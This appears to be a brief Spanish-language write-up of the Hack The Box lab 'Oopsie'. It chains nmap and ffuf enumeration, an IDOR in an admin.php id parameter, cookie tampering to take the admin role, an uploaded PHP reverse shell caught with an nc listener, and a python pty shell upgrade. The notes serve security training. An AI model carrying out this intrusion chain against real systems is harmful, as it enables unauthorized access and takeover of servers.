# Oopsie.md
- nmap -sCV -p- -Pn 10.129.163.38 -> para ver que tenemos
- Puerto 22 -> ssh 80 -> http apache
- Vemos una página -> fuzeamos -> ffuf -u http://10.129.163.38/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
- - solo encontramos index.php -> contacto dominio -> @megacorp.com
  - Vamos a utilizar otra wordlist -> No encontramos nada, nos ponemo s aivnestigar el código fuente y scripts y vemos que hay un login /cdn-cgi/login/script.js
  - probamos a acceder a http://10.129.163.38/cdn-cgi/login/ y vemos un panel de login -> podemos acceder como invitado.

- guest	guest@megacorp.com -> cuenta de invitado.
- http://10.129.163.38/cdn-cgi/login/admin.php?content=accounts&id=2 -> podemos modificar el id -> y ver que existe la cuenta admin@megacorp.com accesID 34322
- Cambiamos la cookie de user a la de admin con el accesID
- Subimos una reverse shell de php (/usr/share/webshells/php/php-reverse-shell.php)y luego ffuf -u http://10.129.163.38/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -e .php para identifcar donde la tenemos.
- en /uploads lo tenemos.
- nc -lvnp 1234 abrimoss nuesstro puerto y vamos al archivo.

- con python3 -c 'import pty;pty.spawn("/bin/bash")' dejamos sfuncional la terminal.
- VAmos al directorio personal y pillamos la flag.
